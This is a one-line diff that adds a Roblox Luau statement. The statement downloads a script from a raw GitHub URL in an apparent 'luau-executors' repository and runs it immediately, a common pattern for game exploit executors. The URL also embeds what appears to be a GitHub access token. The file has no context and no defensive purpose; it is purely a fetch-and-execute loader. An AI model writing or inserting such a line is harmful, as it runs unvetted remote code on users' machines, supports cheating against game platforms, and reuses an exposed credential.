@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/luau-executors/cAPI/refs/heads/main/main.luau?token=GHSAT0AAAAAAC7BVHG2ZKK3D6CIXSC5ZQU6Z6XJCOA"))()
